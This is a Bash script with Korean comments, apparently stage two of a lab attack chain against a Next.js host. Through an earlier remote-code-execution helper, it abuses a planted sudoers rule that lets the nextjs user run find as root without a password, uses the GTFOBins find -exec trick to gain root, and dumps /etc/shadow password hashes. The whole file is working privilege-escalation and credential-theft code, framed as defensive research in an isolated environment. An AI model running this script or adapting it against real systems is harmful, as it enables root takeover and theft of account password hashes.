#!/bin/bash
# 2단계: sudo /usr/bin/find GTFOBins로 nextjs -> root 권한 상승 (T1548.003)
#        + root 전용 행동으로 로컬 자격증명(/etc/shadow) 덤프 (T1003.008)
# 범위: 본인 소유 격리 재현 환경 전용(방어 연구 목적). 사전: 01_rce.sh로 RCE 확보(TARGET_IP 필요).
#
# bootstrap이 심은 오구성 /etc/sudoers.d/nextjs-maint
#   (nextjs ALL=(ALL) NOPASSWD: /usr/bin/find)
# 를 악용한다. find의 -exec는 sudo가 부여한 root 권한으로 임의 명령을 실행하므로
# 비권한 nextjs -> root 로 상승할 수 있다.
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_common.sh"

echo "[*] 현재 권한 (RCE 시점, 비권한 nextjs여야 정상)"
inject "id" | sed 's/^/    /'

echo "[*] sudo 권한 점검 (find NOPASSWD가 보이면 GTFOBins 경로)"
inject "sudo -n -l 2>&1" | sed 's/^/    /'

# GTFOBins: sudo find <경로> -exec <명령> ; 는 find가 root로 <명령>을 실행한다.
# -maxdepth 0 로 지정 경로 1개에만 매칭시켜 명령을 정확히 1회 실행한다.
echo "[*] 권한 상승 실행: sudo find ... -exec id (root로 실행됨)"
ROOT=$(inject "sudo -n /usr/bin/find /etc/hostname -maxdepth 0 -exec id ';'")
echo "$ROOT" | sed 's/^/    /'

if echo "$ROOT" | grep -q 'uid=0(root)'; then
  echo "[+] 권한 상승 성공: find -exec가 uid=0(root)로 명령을 실행함."
  # root 전용 행동: /etc/shadow 덤프 = 로컬 계정 password hash 탈취 (T1003.008).
  # nextjs로는 못 읽고 root만 가능하다. 오프라인 크래킹/측면이동 재료가 된다.
  # (클라우드 STS 키 탈취와 별개인 '로컬 자격증명' 축을 보여준다.)
  echo "[*] 로컬 자격증명 덤프: /etc/shadow (T1003.008, root 전용)"
  SHADOW=$(inject "sudo -n /usr/bin/find /etc/shadow -maxdepth 0 -exec cat '{}' ';'")
  echo "$SHADOW" | sed 's/^/    /'
  if echo "$SHADOW" | grep -q ':'; then
    echo "[+] shadow 덤프 성공: 로컬 계정 해시 확보(root 전용 파일 열람)."
  else
    echo "[!] shadow를 읽지 못함. 상승 결과/파일 존재 확인(로컬 macOS에는 /etc/shadow가 없음)."
  fi
else
  echo "[!] 권한 상승 실패: uid=0을 얻지 못함. sudoers 오구성(/etc/sudoers.d/nextjs-maint) 확인."
fi
echo "[i] 실행 시각(UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
